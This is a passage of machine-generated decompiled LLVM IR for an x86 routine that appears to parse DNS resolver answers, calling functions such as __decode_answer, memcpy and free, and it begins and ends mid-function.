  %v3_805644d = inttoptr i32 %v2_805644d to i32*
  store i32 %v2_805602e, i32* %v3_805644d, align 4
  %v0_805644e = call i32 @__length_question()
  store i32 %v0_805644e, i32* @eax, align 4
  %v0_8056453 = load i32, i32* @esp, align 4
  %v1_8056453 = add i32 %v0_8056453, 16
  %v0_8056456 = load i32, i32* @esi, align 4
  %v2_8056456 = add i32 %v0_8056456, %v0_805644e
  %v0_8056458.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8056458

dec_label_pc_8056458:                             ; preds = %dec_label_pc_8056430, %dec_label_pc_8056449
  %v0_8056449 = phi i32 [ %v3_80563b2, %dec_label_pc_8056430 ], [ %v0_805644e, %dec_label_pc_8056449 ]
  %v0_8056460 = phi i32 [ %v1_8056398, %dec_label_pc_8056430 ], [ %v1_8056453, %dec_label_pc_8056449 ]
  %v0_8056458 = phi i32 [ 0, %dec_label_pc_8056430 ], [ %v0_8056458.pre, %dec_label_pc_8056449 ]
  %storemerge = phi i32 [ 12, %dec_label_pc_8056430 ], [ %v2_8056456, %dec_label_pc_8056449 ]
  store i32 %storemerge, i32* @esi, align 4
  %v2_8056458 = add i32 %v0_8056460, 100
  %v3_8056458 = inttoptr i32 %v2_8056458 to i32*
  %v4_8056458 = load i32, i32* %v3_8056458, align 4
  %v5_8056458 = sub i32 %v0_8056458, %v4_8056458
  %v11_8056458 = xor i32 %v4_8056458, %v0_8056458
  %v12_8056458 = xor i32 %v5_8056458, %v0_8056458
  %v13_8056458 = and i32 %v12_8056458, %v11_8056458
  %v14_8056458 = icmp slt i32 %v13_8056458, 0
  %v16_8056458 = icmp slt i32 %v5_8056458, 0
  %v2_805645c = icmp eq i1 %v16_8056458, %v14_8056458
  br i1 %v2_805645c, label %dec_label_pc_805645e, label %dec_label_pc_8056449

dec_label_pc_805645e:                             ; preds = %dec_label_pc_8056458
  store i32 0, i32* @ebx, align 4
  %v1_8056460 = add i32 %v0_8056460, 27
  %v2_8056460 = inttoptr i32 %v1_8056460 to i8*
  store i8 1, i8* %v2_8056460, align 1
  %v0_805658e.pre = load i32, i32* @ebx, align 4
  %v1_805658e.pre = load i32, i32* @esp, align 4
  %v2_805658e55 = add i32 %v1_805658e.pre, 104
  %v3_805658e56 = inttoptr i32 %v2_805658e55 to i32*
  %v4_805658e57 = load i32, i32* %v3_805658e56, align 4
  %v5_805658e58 = sub i32 %v0_805658e.pre, %v4_805658e57
  %v11_805658e60 = xor i32 %v4_805658e57, %v0_805658e.pre
  %v12_805658e61 = xor i32 %v5_805658e58, %v0_805658e.pre
  %v13_805658e62 = and i32 %v12_805658e61, %v11_805658e60
  %v14_805658e63 = icmp slt i32 %v13_805658e62, 0
  %v16_805658e65 = icmp slt i32 %v5_805658e58, 0
  %v2_805659266 = icmp eq i1 %v16_805658e65, %v14_805658e63
  br i1 %v2_805659266, label %dec_label_pc_805659e, label %dec_label_pc_8056594.lr.ph

dec_label_pc_8056594.lr.ph:                       ; preds = %dec_label_pc_805645e
  %v0_8056594.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8056594

dec_label_pc_805646a:                             ; preds = %dec_label_pc_8056594
  %v1_805646a = add i32 %v0_805646a67, 116
  store i32 %v1_805646a, i32* %eax.global-to-local, align 4
  %v2_805646e = add i32 %v0_805646a67, -4
  %v3_805646e = inttoptr i32 %v2_805646e to i32*
  store i32 %v1_805646a, i32* %v3_805646e, align 4
  %v3_805646f = load i32, i32* %v3_8056594, align 4
  %v5_805646f = add i32 %v0_805646a67, -8
  %v6_805646f = inttoptr i32 %v5_805646f to i32*
  store i32 %v3_805646f, i32* %v6_805646f, align 4
  %v0_8056473 = load i32, i32* @esi, align 4
  %v2_8056473 = add i32 %v0_805646a67, -12
  %v3_8056473 = inttoptr i32 %v2_8056473 to i32*
  store i32 %v0_8056473, i32* %v3_8056473, align 4
  %v2_8056474 = add i32 %v0_805646a67, -16
  %v3_8056474 = inttoptr i32 %v2_8056474 to i32*
  store i32 %v2_805602e, i32* %v3_8056474, align 4
  %v0_8056475 = call i32 @__decode_answer()
  store i32 %v0_8056475, i32* @eax, align 4
  %v1_805647a = load i32, i32* @esp, align 4
  %v2_805647a = add i32 %v1_805647a, 68
  %v3_805647a = inttoptr i32 %v2_805647a to i32*
  store i32 %v0_8056475, i32* %v3_805647a, align 4
  %v0_805647e = load i32, i32* @esp, align 4
  %v1_805647e = add i32 %v0_805647e, 16
  %v2_8056481 = icmp slt i32 %v0_8056475, 0
  %v1_8056483 = icmp eq i1 %v2_8056481, false
  br i1 %v1_8056483, label %dec_label_pc_805649d, label %dec_label_pc_8056485

dec_label_pc_8056485:                             ; preds = %dec_label_pc_805646a
  %v0_8056485 = load i32, i32* @ebx, align 4
  %v1_8056485 = icmp eq i32 %v0_8056485, 0
  br i1 %v1_8056485, label %dec_label_pc_8056630, label %dec_label_pc_805648d

dec_label_pc_805648d:                             ; preds = %dec_label_pc_8056485
  %v1_805648d = add i32 %v0_805647e, 100
  %v2_805648d = inttoptr i32 %v1_805648d to i32*
  %v3_805648d = load i32, i32* %v2_805648d, align 4
  %v4_805648d = icmp eq i32 %v3_805648d, 0
  br i1 %v4_805648d, label %dec_label_pc_8056630, label %dec_label_pc_805659e

dec_label_pc_805649d:                             ; preds = %dec_label_pc_805646a
  %v1_805649d = add i32 %v0_805647e, 43
  %v2_805649d = inttoptr i32 %v1_805649d to i8*
  %v3_805649d = load i8, i8* %v2_805649d, align 1
  %v4_805649d = icmp eq i8 %v3_805649d, 0
  br i1 %v4_805649d, label %dec_label_pc_805653e, label %dec_label_pc_80564a8

dec_label_pc_80564a8:                             ; preds = %dec_label_pc_805649d
  %v0_80564a8 = load i32, i32* @edi, align 4
  %v1_80564a8 = add i32 %v0_80564a8, 28
  %v2_80564a8 = inttoptr i32 %v1_80564a8 to i32*
  %v3_80564a8 = load i32, i32* %v2_80564a8, align 4
  store i32 %v3_80564a8, i32* %eax.global-to-local, align 4
  %v2_80564ab = add i32 %v0_805647e, 160
  %v3_80564ab = inttoptr i32 %v2_80564ab to i32*
  store i32 %v3_80564a8, i32* %v3_80564ab, align 4
  %v0_80564b2 = load i32, i32* @edi, align 4
  %v1_80564b2 = add i32 %v0_80564b2, 32
  %v2_80564b2 = inttoptr i32 %v1_80564b2 to i32*
  %v3_80564b2 = load i32, i32* %v2_80564b2, align 4
  store i32 %v3_80564b2, i32* %eax.global-to-local, align 4
  %v1_80564b5 = load i32, i32* @esp, align 4
  %v2_80564b5 = add i32 %v1_80564b5, 148
  %v3_80564b5 = inttoptr i32 %v2_80564b5 to i32*
  store i32 %v3_80564b2, i32* %v3_80564b5, align 4
  %v0_80564bc = load i32, i32* @edi, align 4
  %v1_80564bc = add i32 %v0_80564bc, 36
  %v2_80564bc = inttoptr i32 %v1_80564bc to i32*
  %v3_80564bc = load i32, i32* %v2_80564bc, align 4
  store i32 %v3_80564bc, i32* %eax.global-to-local, align 4
  %v1_80564bf = load i32, i32* @esp, align 4
  %v2_80564bf = add i32 %v1_80564bf, 152
  %v3_80564bf = inttoptr i32 %v2_80564bf to i32*
  store i32 %v3_80564bc, i32* %v3_80564bf, align 4
  %v0_80564c6 = load i32, i32* @ecx, align 4
  %v1_80564c6 = load i32, i32* @esp, align 4
  %v2_80564c6 = add i32 %v1_80564c6, -4
  %v3_80564c6 = inttoptr i32 %v2_80564c6 to i32*
  store i32 %v0_80564c6, i32* %v3_80564c6, align 4
  %v1_80564c7 = add i32 %v1_80564c6, -8
  %v2_80564c7 = inttoptr i32 %v1_80564c7 to i32*
  store i32 40, i32* %v2_80564c7, align 4
  %v1_80564c9 = add i32 %v1_80564c6, 116
  store i32 %v1_80564c9, i32* %edx.global-to-local, align 4
  %v2_80564cd = add i32 %v1_80564c6, -12
  %v3_80564cd = inttoptr i32 %v2_80564cd to i32*
  store i32 %v1_80564c9, i32* %v3_80564cd, align 4
  %v0_80564ce = load i32, i32* @edi, align 4
  %v2_80564ce = add i32 %v1_80564c6, -16
  %v3_80564ce = inttoptr i32 %v2_80564ce to i32*
  store i32 %v0_80564ce, i32* %v3_80564ce, align 4
  %v4_80564cf = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_80560bc, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80564cf, i32* %eax.global-to-local, align 4
  %v0_80564d4 = load i32, i32* @edi, align 4
  %v1_80564d4 = add i32 %v0_80564d4, 4
  %v2_80564d4 = inttoptr i32 %v1_80564d4 to i32*
  %v3_80564d4 = load i32, i32* %v2_80564d4, align 4
  store i32 %v3_80564d4, i32* %eax.global-to-local, align 4
  %v0_80564d7 = load i32, i32* @esp, align 4
  %v1_80564d7 = add i32 %v0_80564d7, 16
  %v9_80564da = icmp eq i32 %v3_80564d4, 24
  br i1 %v9_80564da, label %dec_label_pc_80564a8.dec_label_pc_8056501_crit_edge, label %dec_label_pc_80564df

dec_label_pc_80564a8.dec_label_pc_8056501_crit_edge: ; preds = %dec_label_pc_80564a8
  %.pre24 = add i32 %v0_80564d7, 260
  %.pre25 = inttoptr i32 %.pre24 to i32*
  %v4_8056501.pre = load i32, i32* %.pre25, align 4
  br label %dec_label_pc_8056501

dec_label_pc_80564df:                             ; preds = %dec_label_pc_80564a8
  %v1_80564df = add i32 %v0_80564d4, 28
  %v2_80564df = inttoptr i32 %v1_80564df to i32*
  %v3_80564df = load i32, i32* %v2_80564df, align 4
  %v4_80564df = icmp eq i32 %v3_80564df, 0
  br i1 %v4_80564df, label %dec_label_pc_805659e, label %dec_label_pc_80564e9

dec_label_pc_80564e9:                             ; preds = %dec_label_pc_80564df
  %v1_80564e9 = add i32 %v0_80564d7, 260
  %v2_80564e9 = inttoptr i32 %v1_80564e9 to i32*
  %v3_80564e9 = load i32, i32* %v2_80564e9, align 4
  %v12_80564e9 = icmp eq i32 %v3_80564e9, 1
  br i1 %v12_80564e9, label %dec_label_pc_8056501, label %dec_label_pc_80564f3

dec_label_pc_80564f3:                             ; preds = %dec_label_pc_80564e9
  %v12_80564f3 = icmp eq i32 %v3_80564e9, 28
  %v1_80564fb = icmp eq i1 %v12_80564f3, false
  br i1 %v1_80564fb, label %dec_label_pc_805659e, label %dec_label_pc_8056501

dec_label_pc_8056501:                             ; preds = %dec_label_pc_80564a8.dec_label_pc_8056501_crit_edge, %dec_label_pc_80564f3, %dec_label_pc_80564e9
  %v4_8056501 = phi i32 [ %v4_8056501.pre, %dec_label_pc_80564a8.dec_label_pc_8056501_crit_edge ], [ %v3_80564e9, %dec_label_pc_80564f3 ], [ %v3_80564e9, %dec_label_pc_80564e9 ]
  %v15_8056501 = icmp eq i32 %v3_80564d4, %v4_8056501
  br i1 %v15_8056501, label %dec_label_pc_8056516, label %dec_label_pc_805650a

dec_label_pc_805650a:                             ; preds = %dec_label_pc_8056501
  %v1_805650d = inttoptr i32 %v0_80564d4 to i32*
  %v2_805650d = load i32, i32* %v1_805650d, align 4
  %v5_805650d = inttoptr i32 %v0_80564d7 to i32*
  store i32 %v2_805650d, i32* %v5_805650d, align 4
  %v1_805650f = call i32 @free(i32 -1)
  store i32 %v1_805650f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056586

dec_label_pc_8056516:                             ; preds = %dec_label_pc_8056501
  %v0_8056516 = load i32, i32* @ebx, align 4
  %v1_8056518 = sub i32 -1, %v0_8056516
  store i32 %v1_8056518, i32* %eax.global-to-local, align 4
  %v2_805651a = add i32 %v0_80564d7, 120
  %v3_805651a = inttoptr i32 %v2_805651a to i32*
  %v4_805651a = load i32, i32* %v3_805651a, align 4
  %v5_805651a = add i32 %v4_805651a, %v1_8056518
  store i32 %v5_805651a, i32* %eax.global-to-local, align 4
  %v2_805651e = add i32 %v0_80564d4, 36
  %v3_805651e = inttoptr i32 %v2_805651e to i32*
  store i32 %v5_805651a, i32* %v3_805651e, align 4
  %v0_8056521 = load i32, i32* @edi, align 4
  %v1_8056521 = add i32 %v0_8056521, 16
  %v2_8056521 = inttoptr i32 %v1_8056521 to i32*
  %v3_8056521 = load i32, i32* %v2_8056521, align 4
  %v1_8056524 = add i32 %v3_8056521, 4
  store i32 %v1_8056524, i32* %eax.global-to-local, align 4
  %v2_8056527 = add i32 %v0_8056521, 36
  %v3_8056527 = inttoptr i32 %v2_8056527 to i32*
  %v4_8056527 = load i32, i32* %v3_8056527, align 4
  %v7_8056527 = mul i32 %v4_8056527, %v1_8056524
  store i32 %v7_8056527, i32* %eax.global-to-local, align 4
  %v2_805652b = add i32 %v0_8056521, 32
  %v3_805652b = inttoptr i32 %v2_805652b to i32*
  %v4_805652b = load i32, i32* %v3_805652b, align 4
  %v6_805652e = icmp ugt i32 %v7_8056527, %v4_805652b
  br i1 %v6_805652e, label %dec_label_pc_8056516.dec_label_pc_805659e.loopexit_crit_edge, label %dec_label_pc_8056530

dec_label_pc_8056516.dec_label_pc_805659e.loopexit_crit_edge: ; preds = %dec_label_pc_8056516
  %v0_805659e.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805659e

dec_label_pc_8056530:                             ; preds = %dec_label_pc_8056516
  store i32 0, i32* %v3_8056527, align 4
  %v0_8056537 = load i32, i32* @esp, align 4
  %v1_8056537 = add i32 %v0_8056537, 27
  %v2_8056537 = inttoptr i32 %v1_8056537 to i8*
  store i8 0, i8* %v2_8056537, align 1
  %v1_8056589.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056589

dec_label_pc_805653e:                             ; preds = %dec_label_pc_805649d
  %v1_8056541 = add i32 %v0_805647e, 132
  %v2_8056541 = inttoptr i32 %v1_8056541 to i32*
  %v3_8056541 = load i32, i32* %v2_8056541, align 4
  %v6_8056541 = inttoptr i32 %v0_805647e to i32*
  store i32 %v3_8056541, i32* %v6_8056541, align 4
  %v1_8056548 = call i32 @free(i32 -1)
  store i32 %v1_8056548, i32* %eax.global-to-local, align 4
  %v0_805654d = load i32, i32* @esp, align 4
  %v1_805654d = add i32 %v0_805654d, 16
  %v1_8056550 = add i32 %v0_805654d, 260
  %v2_8056550 = inttoptr i32 %v1_8056550 to i32*
  %v3_8056550 = load i32, i32* %v2_8056550, align 4
  store i32 %v3_8056550, i32* %eax.global-to-local, align 4
  %v1_8056557 = add i32 %v0_805654d, 136
  %v2_8056557 = inttoptr i32 %v1_8056557 to i32*
  %v3_8056557 = load i32, i32* %v2_8056557, align 4
  %v15_8056557 = icmp eq i32 %v3_8056557, %v3_8056550
  %v1_805655b = icmp eq i1 %v15_8056557, false
  br i1 %v1_805655b, label %dec_label_pc_8056589, label %dec_label_pc_805655d

dec_label_pc_805655d:                             ; preds = %dec_label_pc_805653e
  %v0_805655d = load i32, i32* @edi, align 4
  %v1_805655d = add i32 %v0_805655d, 16
  %v2_805655d = inttoptr i32 %v1_805655d to i32*
  %v3_805655d = load i32, i32* %v2_805655d, align 4
  store i32 %v3_805655d, i32* %eax.global-to-local, align 4
  %v2_8056560 = add i32 %v0_805654d, 148
  %v3_8056560 = inttoptr i32 %v2_8056560 to i32*
  %v4_8056560 = load i32, i32* %v3_8056560, align 4
  %v15_8056560 = icmp eq i32 %v3_805655d, %v4_8056560
  %v1_8056567 = icmp eq i1 %v15_8056560, false
  br i1 %v1_8056567, label %dec_label_pc_8056623, label %dec_label_pc_805656d

dec_label_pc_805656d:                             ; preds = %dec_label_pc_805655d
  %v0_805656d = load i32, i32* @edx, align 4
  %v2_805656d = add i32 %v0_805654d, 12
  %v3_805656d = inttoptr i32 %v2_805656d to i32*
  store i32 %v0_805656d, i32* %v3_805656d, align 4
  %v0_805656e = load i32, i32* %eax.global-to-local, align 4
  %v2_805656e = add i32 %v0_805654d, 8
  %v3_805656e = inttoptr i32 %v2_805656e to i32*
  store i32 %v0_805656e, i32* %v3_805656e, align 4
  %v1_805656f = add i32 %v0_805654d, 152
  %v2_805656f = inttoptr i32 %v1_805656f to i32*
  %v3_805656f = load i32, i32* %v2_805656f, align 4
  %v5_805656f = add i32 %v0_805654d, 4
  %v6_805656f = inttoptr i32 %v5_805656f to i32*
  store i32 %v3_805656f, i32* %v6_805656f, align 4
  %v0_8056576 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056576 = load i32, i32* @edi, align 4
  %v2_8056576 = add i32 %v1_8056576, 36
  %v3_8056576 = inttoptr i32 %v2_8056576 to i32*
  %v4_8056576 = load i32, i32* %v3_8056576, align 4
  %v7_8056576 = mul i32 %v4_8056576, %v0_8056576
  store i32 %v7_8056576, i32* %eax.global-to-local, align 4
  %v2_805657a = add i32 %v1_8056576, 28
  %v3_805657a = inttoptr i32 %v2_805657a to i32*
  %v4_805657a = load i32, i32* %v3_805657a, align 4
  %v5_805657a = add i32 %v4_805657a, %v7_8056576
  store i32 %v5_805657a, i32* %eax.global-to-local, align 4
  %v3_805657d = inttoptr i32 %v0_805654d to i32*
  store i32 %v5_805657a, i32* %v3_805657d, align 4
  %v4_805657e = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_80560bc, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805657e, i32* %eax.global-to-local, align 4
  %v0_8056583 = load i32, i32* @edi, align 4
  %v1_8056583 = add i32 %v0_8056583, 36
  %v2_8056583 = inttoptr i32 %v1_8056583 to i32*
  %v3_8056583 = load i32, i32* %v2_8056583, align 4
  %v4_8056583 = add i32 %v3_8056583, 1
  store i32 %v4_8056583, i32* %v2_8056583, align 4
  br label %dec_label_pc_8056586

dec_label_pc_8056586:                             ; preds = %dec_label_pc_805650a, %dec_label_pc_805656d
  %v0_8056586 = load i32, i32* @esp, align 4
  %v1_8056586 = add i32 %v0_8056586, 16
  br label %dec_label_pc_8056589

dec_label_pc_8056589:                             ; preds = %dec_label_pc_805653e, %dec_label_pc_8056530, %dec_label_pc_8056586
  %v1_8056589 = phi i32 [ %v1_805654d, %dec_label_pc_805653e ], [ %v1_8056589.pre, %dec_label_pc_8056530 ], [ %v1_8056586, %dec_label_pc_8056586 ]
  %v0_8056589 = load i32, i32* @esi, align 4
  %v2_8056589 = add i32 %v1_8056589, 52
  %v3_8056589 = inttoptr i32 %v2_8056589 to i32*
  %v4_8056589 = load i32, i32* %v3_8056589, align 4
  %v5_8056589 = add i32 %v4_8056589, %v0_8056589
  store i32 %v5_8056589, i32* @esi, align 4
  %v0_805658d = load i32, i32* @ebx, align 4
  %v1_805658d = add i32 %v0_805658d, 1
  store i32 %v1_805658d, i32* @ebx, align 4
  %v2_805658e = add i32 %v1_8056589, 104
  %v3_805658e = inttoptr i32 %v2_805658e to i32*
  %v4_805658e = load i32, i32* %v3_805658e, align 4
  %v5_805658e = sub i32 %v1_805658d, %v4_805658e
  %v11_805658e = xor i32 %v4_805658e, %v1_805658d
  %v12_805658e = xor i32 %v5_805658e, %v1_805658d
  %v13_805658e = and i32 %v12_805658e, %v11_805658e
  %v14_805658e = icmp slt i32 %v13_805658e, 0
  %v16_805658e = icmp slt i32 %v5_805658e, 0
  %v2_8056592 = icmp eq i1 %v16_805658e, %v14_805658e
  br i1 %v2_8056592, label %dec_label_pc_805659e, label %dec_label_pc_8056594

dec_label_pc_8056594:                             ; preds = %dec_label_pc_8056594.lr.ph, %dec_label_pc_8056589
  %v0_8056594 = phi i32 [ %v0_8056594.pre, %dec_label_pc_8056594.lr.ph ], [ %v5_8056589, %dec_label_pc_8056589 ]
  %v0_805646a67 = phi i32 [ %v1_805658e.pre, %dec_label_pc_8056594.lr.ph ], [ %v1_8056589, %dec_label_pc_8056589 ]
  %v2_8056594 = add i32 %v0_805646a67, 16
  %v3_8056594 = inttoptr i32 %v2_8056594 to i32*
  %v4_8056594 = load i32, i32* %v3_8056594, align 4
  %v5_8056594 = sub i32 %v0_8056594, %v4_8056594
  %v11_8056594 = xor i32 %v4_8056594, %v0_8056594
  %v12_8056594 = xor i32 %v5_8056594, %v0_8056594
  %v13_8056594 = and i32 %v12_8056594, %v11_8056594
  %v14_8056594 = icmp slt i32 %v13_8056594, 0
  %v16_8056594 = icmp slt i32 %v5_8056594, 0
  %v2_8056598 = icmp eq i1 %v16_8056594, %v14_8056594
  br i1 %v2_8056598, label %dec_label_pc_805659e, label %dec_label_pc_805646a

dec_label_pc_805659e:                             ; preds = %dec_label_pc_805648d, %dec_label_pc_805645e, %dec_label_pc_8056589, %dec_label_pc_80564df, %dec_label_pc_80564f3, %dec_label_pc_8056594, %dec_label_pc_8056516.dec_label_pc_805659e.loopexit_crit_edge
  %v0_805659e = phi i32 [ %v0_805659e.pre.pre, %dec_label_pc_8056516.dec_label_pc_805659e.loopexit_crit_edge ], [ %v1_805658e.pre, %dec_label_pc_805645e ], [ %v1_8056589, %dec_label_pc_8056589 ], [ %v1_80564d7, %dec_label_pc_80564df ], [ %v1_80564d7, %dec_label_pc_80564f3 ], [ %v0_805646a67, %dec_label_pc_8056594 ], [ %v1_805647e, %dec_label_pc_805648d ]
  %v1_80565a1 = add i32 %v0_805659e, 20
  %v2_80565a1 = inttoptr i32 %v1_80565a1 to i32*
  %v3_80565a1 = load i32, i32* %v2_80565a1, align 4
  %v5_80565a1 = add i32 %v0_805659e, -16
  %v6_80565a1 = inttoptr i32 %v5_80565a1 to i32*
  store i32 %v3_80565a1, i32* %v6_80565a1, align 4
  %v1_80565a5 = call i32 @__libc_close(i32 -1)
  store i32 %v1_80565a5, i32* %eax.global-to-local, align 4
  %v0_80565aa = load i32, i32* @esp, align 4
  %v1_80565ad = add i32 %v0_80565aa, 272
  %v2_80565ad = inttoptr i32 %v1_80565ad to i32*
  %v3_80565ad = load i32, i32* %v2_80565ad, align 4
  %v4_80565ad = icmp eq i32 %v3_80565ad, 0
  br i1 %v4_80565ad, label %dec_label_pc_80565c2, label %dec_label_pc_80565b7

dec_label_pc_80565b7:                             ; preds = %dec_label_pc_805659e
  store i32 %v3_80565ad, i32* %edx.global-to-local, align 4
  %v2_80565be = inttoptr i32 %v3_80565ad to i32*
  store i32 %v2_805602e, i32* %v2_80565be, align 4
  %v0_80565ce.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80565ce

dec_label_pc_80565c2:                             ; preds = %dec_label_pc_805659e
  %v3_80565c5 = inttoptr i32 %v0_80565aa to i32*
  store i32 %v2_805602e, i32* %v3_80565c5, align 4
  %v1_80565c6 = call i32 @free(i32 -1)
  store i32 %v1_80565c6, i32* %eax.global-to-local, align 4
  %v0_80565cb = load i32, i32* @esp, align 4
  %v1_80565cb = add i32 %v0_80565cb, 16
  br label %dec_label_pc_80565ce

dec_label_pc_80565ce:                             ; preds = %dec_label_pc_80565b7, %dec_label_pc_80565c2
  %v0_80565ce = phi i32 [ %v0_80565ce.pre, %dec_label_pc_80565b7 ], [ %v1_80565cb, %dec_label_pc_80565c2 ]
  %v1_80565d1 = add i32 %v0_80565ce, 12
  %v2_80565d1 = inttoptr i32 %v1_80565d1 to i32*
  %v3_80565d1 = load i32, i32* %v2_80565d1, align 4
  %v5_80565d1 = add i32 %v0_80565ce, -16
  %v6_80565d1 = inttoptr i32 %v5_80565d1 to i32*
  store i32 %v3_80565d1, i32* %v6_80565d1, align 4
  %v1_80565d5 = call i32 @free(i32 -1)
  store i32 %v1_80565d5, i32* @eax, align 4
  %v0_80565da = load i32, i32* @esp, align 4
  %v1_80565dd = add i32 %v0_80565da, 8
  %v2_80565dd = inttoptr i32 %v1_80565dd to i32*
  store i32 ptrtoint (i8** @global_var_80617a8.550 to i32), i32* %v2_80565dd, align 4
  %v1_80565e2 = add i32 %v0_80565da, 4
  %v2_80565e2 = inttoptr i32 %v1_80565e2 to i32*
  store i32 134565087, i32* %v2_80565e2, align 4
  %v1_80565e7 = add i32 %v0_80565da, 200
  store i32 %v1_80565e7, i32* %ebx.global-to-local, align 4
  %v3_80565ee = inttoptr i32 %v0_80565da to i32*
  store i32 %v1_80565e7, i32* %v3_80565ee, align 4
  %v2_80565ef = call i32 @__pthread_return_void(i32 -1, i32 %v15_80560bc)
  store i32 %v2_80565ef, i32* %eax.global-to-local, align 4
  %v0_80565f4 = load i32, i32* @esp, align 4
  %v1_80565f4 = inttoptr i32 %v0_80565f4 to i32*
  store i32 ptrtoint (i8** @global_var_80617a8.550 to i32), i32* %v1_80565f4, align 4
  %v1_80565fb = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_80565fb, i32* %eax.global-to-local, align 4
  %v0_8056600 = load i32, i32* @esp, align 4
  %v1_8056600 = add i32 %v0_8056600, 56
  %v2_8056600 = inttoptr i32 %v1_8056600 to i32*
  %v3_8056600 = load i32, i32* %v2_8056600, align 4
  store i32 %v3_8056600, i32* @eax, align 4
  %v1_8056604 = add i32 %v0_8056600, 60
  %v2_8056604 = inttoptr i32 %v1_8056604 to i32*
  %v3_8056604 = load i32, i32* %v2_8056604, align 4
  store i32 %v3_8056604, i32* %edx.global-to-local, align 4
  %v1_8056608 = inttoptr i32 %v0_8056600 to i32*
  %v3_8056608 = add i32 %v0_8056600, 4
  %v1_8056609 = inttoptr i32 %v3_8056608 to i32*
  %v1_805660a = sext i32 %v3_8056600 to i64
  store i64 %v1_805660a, i64* @global_var_80617c0.551, align 64
  %v1_805660f = trunc i32 %v3_8056604 to i16
  store i16 %v1_805660f, i16* @global_var_805b504.552, align 4
  store i32 1, i32* %v1_8056609, align 4
  %v0_8056618 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8056618, i32* %v1_8056608, align 4
  %v2_8056619 = call i32 @__pthread_return_void(i32 -1, i32 %v15_80560bc)
  store i32 %v2_8056619, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805675a

dec_label_pc_8056623:                             ; preds = %dec_label_pc_805655d
  %v1_8056626 = inttoptr i32 %v0_805655d to i32*
  %v2_8056626 = load i32, i32* %v1_8056626, align 4
  %v5_8056626 = inttoptr i32 %v0_805654d to i32*
  store i32 %v2_8056626, i32* %v5_8056626, align 4
  %v1_8056628 = call i32 @free(i32 -1)
  store i32 %v1_8056628, i32* @eax, align 4
  %v0_805662d = load i32, i32* @esp, align 4
  %v1_805662d = add i32 %v0_805662d, 16
  br label %dec_label_pc_8056630

dec_label_pc_8056630:                             ; preds = %dec_label_pc_8056362, %dec_label_pc_805648d, %dec_label_pc_8056485, %dec_label_pc_8056421, %dec_label_pc_80563a7, %dec_label_pc_8056383, %dec_label_pc_8056623
  %v1_8056637 = phi i32 [ %v1_8056377, %dec_label_pc_8056362 ], [ %v1_805647e, %dec_label_pc_805648d ], [ %v1_805647e, %dec_label_pc_8056485 ], [ %v1_8056398, %dec_label_pc_8056421 ], [ %v1_8056398, %dec_label_pc_80563a7 ], [ %v1_8056398, %dec_label_pc_8056383 ], [ %v1_805662d, %dec_label_pc_8056623 ]
  %v1_8056630 = add i32 %v1_8056637, 51
  %v2_8056630 = inttoptr i32 %v1_8056630 to i8*
  %v3_8056630 = load i8, i8* %v2_8056630, align 1
  %v4_8056630 = icmp eq i8 %v3_8056630, 0
  %v1_8056635 = icmp eq i1 %v4_8056630, false
  br i1 %v1_8056635, label %dec_label_pc_805667b, label %dec_label_pc_8056637

dec_label_pc_8056637:                             ; preds = %dec_label_pc_8056630
  %v0_8056637 = load i32, i32* @ecx, align 4
  %v2_8056637 = add i32 %v1_8056637, -4
  %v3_8056637 = inttoptr i32 %v2_8056637 to i32*
  store i32 %v0_8056637, i32* %v3_8056637, align 4
  %v1_8056638 = add i32 %v1_8056637, -8
  %v2_8056638 = inttoptr i32 %v1_8056638 to i32*
  store i32 ptrtoint (i32* @global_var_805b508.489 to i32), i32* %v2_8056638, align 4
  %v1_805663d = add i32 %v1_8056637, -12
  %v2_805663d = inttoptr i32 %v1_805663d to i32*
  store i32 134565087, i32* %v2_805663d, align 4
  %v1_8056642 = add i32 %v1_8056637, 184
  store i32 %v1_8056642, i32* @esi, align 4
  %v2_8056649 = add i32 %v1_8056637, -16
  %v3_8056649 = inttoptr i32 %v2_8056649 to i32*
  store i32 %v1_8056642, i32* %v3_8056649, align 4
  %v2_805664a = call i32 @__pthread_return_void(i32 -1, i32 %v15_80560bc)
  store i32 %v2_805664a, i32* %eax.global-to-local, align 4
  %v0_805664f = load i32, i32* @esp, align 4
  %v1_805664f = inttoptr i32 %v0_805664f to i32*
  store i32 ptrtoint (i32* @global_var_805b508.489 to i32), i32* %v1_805664f, align 4
  %v1_8056656 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8056656, i32* %eax.global-to-local, align 4
  %v0_805665b = load i32, i32* @global_var_8061bf8.553, align 8
  store i32 %v0_805665b, i32* %ebx.global-to-local, align 4
  %v0_8056661 = load i32, i32* @esp, align 4
  %v1_8056661 = inttoptr i32 %v0_8056661 to i32*
  %v2_8056661 = load i32, i32* %v1_8056661, align 4
  store i32 %v2_8056661, i32* @eax, align 4
  %v3_8056661 = add i32 %v0_8056661, 4
  %v1_8056662 = inttoptr i32 %v3_8056661 to i32*
  %v2_8056662 = load i32, i32* %v1_8056662, align 4
  store i32 %v2_8056662, i32* %edx.global-to-local, align 4
  %v1_8056663 = add i32 %v0_805665b, -1
  store i32 %v1_8056663, i32* @ebx, align 4
  store i32 1, i32* %v1_8056662, align 4
  %v0_8056666 = load i32, i32* @esi, align 4
  store i32 %v0_8056666, i32* %v1_8056661, align 4
  %v2_8056667 = call i32 @__pthread_return_void(i32 -1, i32 %v15_80560bc)
  store i32 %v2_8056667, i32* %eax.global-to-local, align 4
  %v0_805666c = load i32, i32* @esp, align 4
  %v1_805666c = add i32 %v0_805666c, 16
  %v1_805666f = add i32 %v0_805666c, 52
  %v2_805666f = inttoptr i32 %v1_805666f to i32*
  %v3_805666f = load i32, i32* %v2_805666f, align 4
  %v4_805666f = load i32, i32* @ebx, align 4
  %v5_805666f = sub i32 %v3_805666f, %v4_805666f
